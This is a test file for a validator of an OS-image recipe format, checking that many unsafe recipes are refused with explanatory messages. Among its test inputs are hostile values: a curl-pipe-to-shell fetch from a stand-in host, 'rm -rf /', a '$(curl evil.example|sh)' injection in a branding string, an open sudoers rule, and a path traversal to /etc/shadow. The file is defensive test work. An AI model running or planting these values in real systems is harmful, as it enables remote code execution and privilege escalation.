/**
 * The refusals. This is the important file.
 *
 * A recipe format is judged by what it will not express. Every entry below is a recipe somebody
 * could plausibly write -- carelessly, under deadline pressure, or on purpose -- that MUST be
 * refused, and the assertion is not merely that it was refused but that the refusal SAID THE RIGHT
 * THING. A rejection a reader does not understand gets worked around, and every workaround for
 * these particular rules ends in a fleet that stops receiving repairs while still looking
 * maintained.
 *
 * The happy paths are in happy.test.ts and there are three of them. There are far more of these,
 * and that ratio is the point: spec section 6C says the abort path is tested more than the happy
 * path, and the same reasoning applies to a format whose product is subtraction.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { check, kiosk, mutate, said, school, workstation, type Doc } from './helpers.ts';

interface Case {
  /** What somebody was trying to do. */
  readonly label: string;
  readonly doc: Doc;
  /** Part of the sentence the refusal must contain. Case-insensitive. */
  readonly says: RegExp;
}

const S = school();
const K = kiosk();
const W = workstation();

const MUST_REFUSE: ReadonlyArray<Case> = [
  // ---- the FROM line, in each of its disguises ---------------------------------------------------
  {
    label: 'a FROM override',
    doc: mutate(S, (d) => { d['from'] = 'ghcr.io/somebody/else:latest'; }),
    says: /no field for the base image|cannot name what it is built on/i,
  },
  {
    label: 'a different base by another name',
    doc: mutate(S, (d) => { d['base'] = 'docker.io/library/fedora:41'; }),
    says: /every organisation is on the same foundation|same foundation/i,
  },
  {
    label: 'a base pinned by digest, which looks like caution',
    doc: mutate(S, (d) => { d['digest'] = 'sha256:aaaa'; }),
    says: /freezes them off the rebuild|freezes that customer off|off the rebuild that carries the next security fix/i,
  },
  {
    label: 'a base smuggled in under a camelCase key the schema never listed',
    doc: mutate(S, (d) => { d['baseImage'] = 'ghcr.io/elsewhere/thing@sha256:beef'; }),
    says: /cannot name what it is built on/i,
  },
  {
    label: 'a whole Containerfile',
    doc: mutate(S, (d) => { d['containerfile'] = 'FROM scratch'; }),
    says: /no field for the base image, and that is the point/i,
  },

  // ---- kernels, drivers, boot arguments ----------------------------------------------------------
  {
    label: 'a kernel pin',
    doc: mutate(S, (d) => { d['kernel'] = '6.1.0-lts'; }),
    says: /kernel.*belongs? to the base|fork wearing a smaller hat/i,
  },
  {
    label: 'a boot argument',
    doc: mutate(S, (d) => { d['kargs'] = ['quiet']; }),
    says: /boot command line|fork wearing a smaller hat/i,
  },
  {
    label: 'an out-of-tree driver for one stubborn wifi card',
    doc: mutate(S, (d) => { d['dkms'] = ['broadcom-wl']; }),
    says: /drivers.*belong to the base|one team patches them once/i,
  },
  {
    label: 'kernel arguments under a key the schema does not list',
    doc: mutate(S, (d) => { d['kernelArgs'] = ['mitigations=off']; }),
    says: /cannot choose a kernel/i,
  },

  // ---- version pins, in five spellings -----------------------------------------------------------
  {
    label: 'a version pin as a field',
    doc: mutate(S, (d) => { d['hold'] = ['firefox']; }),
    says: /nothing can be held at a version|unpatched while still/i,
  },
  {
    label: 'a version pin spelled as an application: firefox-140.0',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('firefox-140.0'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as an application: Firefox 140',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Firefox 140'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as a constraint: kernel>=6.1',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('kernel>=6.1'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as an assignment: foo=1.2',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('foo=1.2'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as a full rpm NEVRA',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('firefox-1:115-3.fc41.x86_64'); }),
    says: /no digits|raw package or Flatpak identifier/i,
  },
  {
    label: 'a raw Flatpak reference instead of a name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('org.mozilla.firefox'); }),
    says: /three different spellings|raw package or Flatpak identifier|catalogue/i,
  },
  {
    label: 'a version exclusion under an unlisted key',
    doc: mutate(S, (d) => { d['pinnedVersions'] = { firefox: '140' }; }),
    says: /nothing can be held at a version/i,
  },

  // ---- pruning the update path -------------------------------------------------------------------
  {
    label: 'pruning bootc',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('bootc'); }),
    says: /no way to write the sentence that would brick a fleet/i,
  },
  {
    label: 'pruning the update timer',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('update timer'); }),
    says: /no way to write the sentence that would brick a fleet/i,
  },
  {
    label: 'pruning NetworkManager',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('NetworkManager'); }),
    says: /to reach the network[\s\S]*brick a fleet/i,
  },
  {
    label: 'pruning greenboot, the thing that undoes a bad update',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('greenboot'); }),
    says: /roll back a failed update[\s\S]*brick a fleet/i,
  },
  {
    label: 'pruning a screen reader',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('screen reader'); }),
    says: /screen reader/i,
  },
  {
    label: 'switching updates off entirely',
    doc: mutate(S, (d) => { d['disable_updates'] = true; }),
    says: /safety net is not optional|rollback/i,
  },

  // ---- the gates ---------------------------------------------------------------------------------
  {
    label: 'asking for fewer checks',
    doc: mutate(S, (d) => { d['skip_checks'] = true; }),
    says: /no way to ask for less testing/i,
  },
  {
    label: 'publishing without a test build',
    doc: mutate(S, (d) => { d['publish_without_test'] = true; }),
    says: /no way to ask for less testing/i,
  },
  {
    label: 'shipping unsigned',
    doc: mutate(S, (d) => { d['unsigned'] = true; }),
    says: /no way to ask for less testing/i,
  },
  {
    label: 'skipping a test machine, which is the one direction also_test does not go',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['also_skip'] = ['bios-legacy']; }),
    says: /'also_skip' is not a field this file has/,
  },

  // ---- running code, dropping files, adding sources ----------------------------------------------
  {
    label: 'a post-install script',
    doc: mutate(S, (d) => { d['post_install'] = 'curl https://x.example | sh'; }),
    says: /cannot run code|stranger can send us a command/i,
  },
  {
    label: 'a build hook under an unlisted key',
    doc: mutate(S, (d) => { d['postInstallScript'] = 'rm -rf /'; }),
    says: /cannot run code/i,
  },
  {
    label: 'an extra package source',
    doc: mutate(S, (d) => { d['copr'] = ['somebody/thing']; }),
    says: /software source|reviewed once for everybody|package source/i,
  },
  {
    label: 'turning off signature checking on packages',
    doc: mutate(S, (d) => { d['nogpgcheck'] = true; }),
    says: /switch off signature checking on a package/i,
  },
  {
    label: 'an arbitrary file overlay',
    doc: mutate(S, (d) => { d['files'] = { '/etc/sudoers.d/99-open': 'ALL ALL=(ALL) NOPASSWD:ALL' }; }),
    says: /arbitrary files|script with extra steps/i,
  },

  // ---- shell escapes in text that reaches the image ----------------------------------------------
  {
    label: 'a shell escape in the branding string',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example $(curl evil.example|sh) Vidyalaya'; }),
    says: /command substitution|never seen by a shell|base64/i,
  },
  {
    label: 'a backtick in the first-boot message',
    doc: mutate(S, (d) => { d['first_boot_message'] = 'Welcome `id`'; }),
    says: /command substitution/i,
  },
  {
    label: 'a shell variable expansion in a helpdesk label',
    doc: mutate(S, (d) => { ((d['organisation'] as Doc)['helpdesk'] as Doc)['label'] = 'Help ${HOME}'; }),
    says: /command substitution/i,
  },
  {
    label: 'a text-direction override that makes the file read one way and mean another',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example‮Vidyalaya'; }),
    says: /direction|override|control characters/i,
  },

  // ---- secrets in a public repository ------------------------------------------------------------
  {
    label: 'the wireless password, which is the single most tempting field',
    doc: mutate(S, (d) => { d['wifi_password'] = 'hunter2'; }),
    says: /public by design|no credential/i,
  },
  {
    label: 'an API token under an unlisted key',
    doc: mutate(S, (d) => { d['apiKey'] = 'sk-live-abc'; }),
    says: /credential|public/i,
  },

  // ---- claims we cannot evidence -----------------------------------------------------------------
  {
    label: 'a blanket compatibility claim',
    doc: mutate(S, (d) => { d['compatibility'] = 'most Windows apps work'; }),
    says: /cannot make a general claim/i,
  },
  {
    label: 'a testimonial',
    doc: mutate(S, (d) => { d['testimonial'] = 'best OS ever'; }),
    says: /cannot make a general claim/i,
  },
  {
    label: '"works" with no caveat written down',
    doc: mutate(S, (d) => { delete ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['note']; }),
    says: /a positive result needs its caveats written down/i,
  },

  // ---- hardware ----------------------------------------------------------------------------------
  {
    label: 'a hardware test profile that does not exist',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['also_test'] = ['uefi-moderrn']; }),
    says: /Nearest: uefi-modern\./,
  },
  {
    label: 'a virtual test machine invented on the spot',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['also_test'] = ['the-headmasters-laptop']; }),
    says: /not one of the published choices[\s\S]*virtual test machine/i,
  },

  // ---- languages, keyboards, and a fleet nobody can log into --------------------------------------
  {
    label: 'a locale with no font package, spelled as a locale code',
    doc: mutate(S, (d) => { d['language'] = 'mr_IN.UTF-8'; }),
    says: /no codes, no digits/i,
  },
  {
    label: 'a language we have no fonts for',
    doc: mutate(S, (d) => { d['language'] = 'Klingon'; }),
    says: /knows how to draw|empty boxes/i,
  },
  {
    label: 'a first-boot message in a script none of the fleet languages brings',
    doc: mutate(W, (d) => { d['first_boot_message'] = 'नमस्कार'; }),
    says: /devanagari|fonts for that|empty boxes/i,
  },
  {
    label: 'a non-Latin primary keyboard, which strands the login screen',
    doc: mutate(S, (d) => { d['keyboard'] = 'Marathi (InScript)'; }),
    says: /login screen|disk-unlock|published choices/i,
  },
  {
    label: 'a second script with no way to reach it',
    doc: mutate(S, (d) => { delete d['switch_scripts_with']; }),
    says: /second script needs a way to switch/i,
  },
  {
    label: 'a timezone as an offset, which is wrong twice a year',
    doc: mutate(S, (d) => { d['timezone'] = 'UTC+05:30'; }),
    says: /an offset is wrong twice a year/i,
  },

  // ---- policy modes that mean what they say -------------------------------------------------------
  {
    label: 'a terminal on a managed fleet, asked for directly',
    doc: mutate(S, (d) => { d['desktop'] = { can_reach_a_terminal: true }; }),
    says: /terminal only exists on an open machine/i,
  },
  {
    label: 'a terminal on a managed fleet, smuggled in as an application',
    // also_remove is narrowed first so this case proves the terminal rule alone rather than
    // passing on the install-and-remove contradiction, which the next case covers.
    doc: mutate(S, (d) => { (d['prune'] as Doc)['also_remove'] = ['games', 'remote desktop']; (d['apps'] as string[]).push('Konsole'); }),
    says: /'Konsole' is a terminal, and this fleet is managed/,
  },
  {
    label: 'a software installer on a fleet that may not install software',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Software Centre'); }),
    says: /installs software|can_install_apps/i,
  },
  {
    label: 'a locked fleet that can install applications',
    doc: mutate(S, (d) => { d['policy'] = 'locked'; d['desktop'] = { can_install_apps: true }; }),
    says: /locked means locked/i,
  },
  {
    label: 'a kiosk with a desktop to shape',
    doc: mutate(K, (d) => { d['desktop'] = { taskbar_and_start_menu: true }; }),
    says: /kiosk has no desktop/i,
  },
  {
    label: 'a kiosk running Windows programs',
    doc: mutate(K, (d) => { d['windows_apps'] = { enabled: true, we_promise_nothing_else: true }; }),
    says: /kiosk cannot run windows programs/i,
  },
  {
    label: 'a kiosk keeping a full desktop',
    doc: mutate(K, (d) => { (d['prune'] as Doc)['keep_only_the_apps_above'] = false; }),
    says: /kiosk keeps only what it opens/i,
  },
  {
    label: 'a kiosk served over plain http',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['opens'] = 'http://start.example.org/kiosk'; }),
    says: /a way out of the kiosk rather than a page inside it/i,
  },
  {
    label: 'a kiosk allowed to reach nothing at all',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['allowed_sites'] = []; }),
    says: /fewer than 1 items[\s\S]*hostnames the window may navigate to/i,
  },
  {
    label: 'a kiosk whose own page is not on its allow-list',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['opens'] = 'https://elsewhere.example.org/start'; }),
    says: /not in allowed_sites|error page/i,
  },

  // ---- subtraction is not optional ----------------------------------------------------------------
  {
    label: 'no prune block at all',
    doc: mutate(S, (d) => { delete d['prune']; }),
    says: /no 'prune', and it is required[\s\S]*this block is the product/i,
  },
  {
    label: 'a removal floor of zero',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['must_remove_at_least'] = 0; }),
    says: /zero is not a legal value|alarm anyone can turn down/i,
  },
  {
    label: 'keeping the whole desktop without saying what comes out of it',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['keep_only_the_apps_above'] = false; delete (d['prune'] as Doc)['also_remove']; }),
    says: /saying what to take out/i,
  },
  {
    label: 'a typo in a subtraction key, which must never be silently ignored',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['also_remvoe'] = ['games']; }),
    says: /did you mean also_remove|quietly dropped/i,
  },
  {
    label: 'keeping and removing the same thing',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_keep'] as string[]).push('bluetooth'); ((d['prune'] as Doc)['also_remove'] as string[]).push('bluetooth'); }),
    says: /both also_keep and also_remove/i,
  },
  {
    label: 'installing an application and removing the group it belongs to',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('media players'); }),
    says: /also removes the group|one of those two instructions is going to lose/i,
  },

  // ---- the closed world itself --------------------------------------------------------------------
  {
    label: 'an unknown schema version',
    doc: mutate(S, (d) => { d['schema'] = 2; }),
    says: /refuses to build rather than guessing what a field used to mean/i,
  },
  {
    label: 'any key at all that the schema does not know',
    doc: mutate(S, (d) => { d['notes'] = 'anything'; }),
    says: /not a field this file has|quietly dropped/i,
  },
  {
    label: 'a name that could be read as an image tag somewhere downstream',
    doc: mutate(S, (d) => { d['name'] = 'example-school:v2'; }),
    says: /read as an image tag or digest somewhere downstream/i,
  },
  {
    label: 'a name that does not match the folder it sits in',
    doc: mutate(S, (d) => { d['name'] = 'some-other-school'; }),
    says: /does not match the folder/i,
  },
  {
    label: 'a "for" paragraph too short to explain anything to whoever inherits it',
    doc: mutate(S, (d) => { d['for'] = 'some school laptops'; }),
    says: /a blank one is a file nobody can inherit/i,
  },
  {
    label: 'no size budget at all',
    doc: mutate(S, (d) => { delete d['size_budget_gb']; }),
    says: /no 'size_budget_gb', and it is required[\s\S]*quietly failing/i,
  },
  {
    label: 'a logo fetched from the internet',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = 'https://x.example/logo.png'; }),
    says: /supply-chain dependency into a school's wallpaper/i,
  },
  {
    label: 'a logo reached by path traversal',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = '../../etc/shadow.png'; }),
    says: /no path, no parent directory, no symlink, no URL/i,
  },
];

test('every refusal fires, and says why refusing is the feature', async (t) => {
  for (const entry of MUST_REFUSE) {
    await t.test(entry.label, () => {
      const result = check(entry.doc);
      assert.equal(result.ok, false, `ACCEPTED but must be refused: ${entry.label}`);
      const text = said(result);
      assert.match(
        text,
        entry.says,
        `refused, but not with a sentence that teaches the rule.\n` +
          `  wanted to see: ${entry.says}\n` +
          `  actually said:\n${text.split('\n').map((l) => `    ${l}`).join('\n')}`,
      );
    });
  }
});

test('the table is large enough to be worth having', () => {
  // Not a real assertion about correctness -- a guard against the table being quietly emptied. If
  // this ever fails because somebody consolidated cases, raise the floor deliberately or lower it
  // in a commit that says why.
  assert.ok(MUST_REFUSE.length >= 50, `only ${MUST_REFUSE.length} refusal cases`);
});

test('a refusal never leaks raw validator noise where a sentence was available', () => {
  const result = check(mutate(S, (d) => { d['from'] = 'ghcr.io/x/y'; }));
  assert.equal(result.ok, false);
  assert.doesNotMatch(said(result), /must NOT be valid|should NOT be valid/i);
});
